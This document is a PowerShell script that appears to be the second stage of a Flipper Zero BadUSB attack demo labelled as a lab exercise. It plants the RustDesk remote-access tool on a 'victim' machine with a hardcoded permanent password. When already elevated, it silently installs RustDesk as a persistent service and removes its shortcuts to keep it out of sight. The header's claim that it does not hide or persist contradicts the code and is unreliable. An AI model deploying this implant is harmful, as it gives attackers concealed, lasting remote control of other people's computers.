# Hackoween 2026 — lab demo bootstrap. Runs on the isolated lab victim VM only.
#
# Two paths, chosen at runtime by whether we already hold an elevated token:
#   - NON-elevated (the normal Flipper case): portable, user-level, NO install, NO service,
#     NO UAC. Permanent password seeded via RustDesk.toml.
#   - ELEVATED (shell already ran high-integrity): self-install the persistent RustDesk
#     service and set the permanent password over its IPC. No UAC prompt, because the
#     elevated token is already held — we never trigger elevation ourselves.
#
# This script ships INSIDE boo.7z alongside rustdesk.exe, RustDesk2.toml and RustDesk.toml.
# The Flipper
# payload (act1-badusb.txt) downloads and extracts that archive into C:\tmp, then runs
# this. Everything it needs is already on disk next to it — it makes no network requests
# of its own. The only download in the whole chain is the encrypted archive.
#
# This is a demonstration artifact for an isolated, authorized lab. It talks only to the
# lab rendezvous server; it makes no attempt to hide, persist, or elevate.

$ErrorActionPreference = 'Stop'

# 1. Everything came out of the archive into this script's own directory.
#    RustDesk2.toml = network config (rendezvous server + key).
#    RustDesk.toml  = main config; seeds the permanent password 'hackoween'.
$src   = $PSScriptRoot
$exe   = Join-Path $src 'rustdesk.exe'
$toml2 = Join-Path $src 'RustDesk2.toml'
$toml  = Join-Path $src 'RustDesk.toml'

foreach ($f in @($exe, $toml2, $toml)) {
    if (-not (Test-Path $f)) {
        throw "Missing $f - boo.7z did not extract as expected. Check the archive layout."
    }
}

$DefaultPassword = 'hackoween'

# 2. Are we ALREADY running with an elevated token? Admin GROUP membership alone is not
#    enough — with UAC on, an admin still runs with a filtered (non-elevated) token, and
#    the Flipper-spawned shell is non-elevated. IsInRole(Administrator) is true ONLY with
#    the elevated token, which is exactly the condition under which a service install needs
#    no UAC prompt. So this branch never triggers elevation itself: it installs the service
#    only when elevation is already in hand, and otherwise stays fully user-level.
$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$isElevated = ([Security.Principal.WindowsPrincipal]$id).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isElevated) {
    # 3a. ELEVATED -> persistent service. The portable exe self-installs via --silent-install
    #     (same mechanism as Install-RustDesk.ps1). The silent installer reads a preset
    #     <exe-basename>.toml next to it for the lab server config, so write rustdesk.toml
    #     from our network config first.
    Write-Host 'Elevated token present - installing RustDesk as a persistent service...'
    $preset = [IO.Path]::ChangeExtension($exe, '.toml')   # -> rustdesk.toml beside the exe
    Copy-Item $toml2 $preset -Force

    # Do NOT use -Wait here: --silent-install launches the installed app and the spawned
    # process does not exit, so -Wait would hang forever. Fire and forget; the real "install
    # finished" signal is the service reaching Running, which the poll below waits on.
    Start-Process -FilePath $exe -ArgumentList '--silent-install'

    # Wait for the service to be Running, then set the permanent password. With the service
    # up, --password finally has a privileged IPC endpoint to persist to.
    $installed = Join-Path $env:ProgramFiles 'RustDesk\rustdesk.exe'
    $deadline  = (Get-Date).AddSeconds(60)
    while (-not (Get-Service -Name 'RustDesk' -ErrorAction SilentlyContinue |
                 Where-Object { $_.Status -eq 'Running' })) {
        if ((Get-Date) -gt $deadline) { throw 'RustDesk service did not reach Running.' }
        Start-Sleep -Milliseconds 500
    }
    & $installed --password $DefaultPassword
    Write-Host "Service installed and running; permanent password set to: $DefaultPassword"

    # Remove the shortcuts the silent installer drops, so the victim desktop stays clean on
    # screen. Covers all-users and per-user Desktop + Start menu (single .lnk or a folder).
    $shortcuts = @(
        (Join-Path $env:PUBLIC 'Desktop\RustDesk.lnk'),
        (Join-Path ([Environment]::GetFolderPath('Desktop')) 'RustDesk.lnk'),
        (Join-Path $env:USERPROFILE 'Desktop\RustDesk.lnk'),
        (Join-Path $env:ProgramData 'Microsoft\Windows\Start Menu\Programs\RustDesk.lnk'),
        (Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\RustDesk.lnk')
    )
    foreach ($s in $shortcuts) { Remove-Item $s -Force -ErrorAction SilentlyContinue }
    # Some builds create a Start-menu *folder* rather than a single .lnk.
    Remove-Item (Join-Path $env:ProgramData 'Microsoft\Windows\Start Menu\Programs\RustDesk') `
        -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item (Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\RustDesk') `
        -Recurse -Force -ErrorAction SilentlyContinue
}
else {
    # 3b. NON-ELEVATED (normal Flipper path) -> portable, user-level, no install, no UAC.
    #     Drop both configs BEFORE launch so the client reads the seeded permanent password
    #     on startup; --password is a no-op here (no service), so RustDesk.toml carries it.
    $cfgDir = Join-Path $env:APPDATA 'RustDesk\config'
    New-Item -ItemType Directory -Force -Path $cfgDir | Out-Null
    Copy-Item $toml2 (Join-Path $cfgDir 'RustDesk2.toml') -Force
    Copy-Item $toml  (Join-Path $cfgDir 'RustDesk.toml')  -Force

    # Launch as the current user, straight out of C:\tmp. Window stays VISIBLE on purpose.
    Start-Process $exe
    Write-Host "Portable user-level launch; permanent password seeded as: $DefaultPassword"
}
